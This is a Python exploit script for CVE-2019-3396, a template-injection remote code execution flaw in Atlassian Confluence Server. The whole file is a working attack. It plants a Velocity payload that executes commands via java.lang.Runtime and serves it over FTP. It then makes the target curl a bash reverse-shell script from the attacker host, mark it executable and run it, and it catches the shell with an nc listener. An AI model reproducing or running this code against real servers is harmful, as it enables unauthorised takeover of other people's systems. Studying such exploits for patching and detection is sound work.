#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▄█▄    ████▄    ▄   ▄████  █       ▄   ▄███▄      ▄   ▄█▄    ▄███▄   █▄▄▄▄ ▄█▄    ▄███▄                    #
#█▀ ▀▄  █   █     █  █▀   ▀ █        █  █▀   ▀      █  █▀ ▀▄  █▀   ▀  █  ▄▀ █▀ ▀▄  █▀   ▀                   #
#█   ▀  █   █ ██   █ █▀▀    █     █   █ ██▄▄    ██   █ █   ▀  ██▄▄    █▀▀▌  █   ▀  ██▄▄                     #
#█▄  ▄▀ ▀████ █ █  █ █      ███▄  █   █ █▄   ▄▀ █ █  █ █▄  ▄▀ █▄   ▄▀ █  █  █▄  ▄▀ █▄   ▄▀                  #
#▀███▀        █  █ █  █         ▀ █▄ ▄█ ▀███▀   █  █ █ ▀███▀  ▀███▀     █   ▀███▀  ▀███▀                    #
# █   ██   ▀           ▀▀▀          █   ██                 ▀                                                #
# confluence_rce .py - nighter@nighter.se [CVE-2019-3396]                                         #
#                                                                                                           #
# DATE                                                                                                      #
# 03/04/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# The Widget Connector macro in Atlassian Confluence Server before version 6.6.12                           #
# (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x),           #
# from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2   #
# (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code         #
# execution on a Confluence Server or Data Center instance via server-side template injection.              #
#                                                                                                           #
#                                                                                                           #
#############################################################################################################

import requests
import time
import sys
import os

from multiprocessing import Process


def create_payload():

    payload = '''#set ($e="exp")
#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end'''

    with open('/tmp/payload.vm', 'w') as file:
        file.write(payload)

    payload = '''#!/bin/bash
bash -i >& /dev/tcp/%s/%s 0>&1''' % (LHOST, LPORT)

    with open('/tmp/payload.sh', 'w') as file:
        file.write(payload)


def start_ftp_server():
    os.chdir('/tmp')
    os.system("python3 -m pyftpdlib -p 2121 > /dev/null 2>&1")


def rce_cmd(command):

    session = requests.session()
    url = "%s/rest/tinymce/1/macro/preview" % URL
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
               "Referer": "%s/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&" % url,
               "Content-Type": "application/json; charset=utf-8"}

    json_payload = {"contentId": "12345", "macro": {"body": "", "name": "widget",
                                            "params": {"_template": "ftp://%s:2121/payload.vm" % LHOST, "cmd": "%s" % command,
                                                       "height": "200",
                                                       "url": "http://www.dailymotion.com/video/xcpa64",
                                                       "width": "300"}}}

    r = session.post(url, headers=headers, json=json_payload)


def exploit():

    time.sleep(3)
    print('[+] Exploit')

    command = '''curl ftp://%s:2121/payload.sh -o /tmp/payload.sh''' % LHOST
    rce_cmd(command)

    command = '''chmod +x /tmp/payload.sh'''
    rce_cmd(command)

    command = '''/tmp/payload.sh'''
    rce_cmd(command)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
▄█▄    ████▄    ▄   ▄████  █       ▄   ▄███▄      ▄   ▄█▄    ▄███▄   █▄▄▄▄ ▄█▄    ▄███▄   
█▀ ▀▄  █   █     █  █▀   ▀ █        █  █▀   ▀      █  █▀ ▀▄  █▀   ▀  █  ▄▀ █▀ ▀▄  █▀   ▀  
█   ▀  █   █ ██   █ █▀▀    █     █   █ ██▄▄    ██   █ █   ▀  ██▄▄    █▀▀▌  █   ▀  ██▄▄    
█▄  ▄▀ ▀████ █ █  █ █      ███▄  █   █ █▄   ▄▀ █ █  █ █▄  ▄▀ █▄   ▄▀ █  █  █▄  ▄▀ █▄   ▄▀ 
▀███▀        █  █ █  █         ▀ █▄ ▄█ ▀███▀   █  █ █ ▀███▀  ▀███▀     █   ▀███▀  ▀███▀   
             █   ██   ▀           ▀▀▀          █   ██                 ▀                   
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./confluence_rce.py 'http://localhost:8090' 10.10.14.24 1337\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    create_payload()
    p = Process(target=start_ftp_server)
    p.start()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)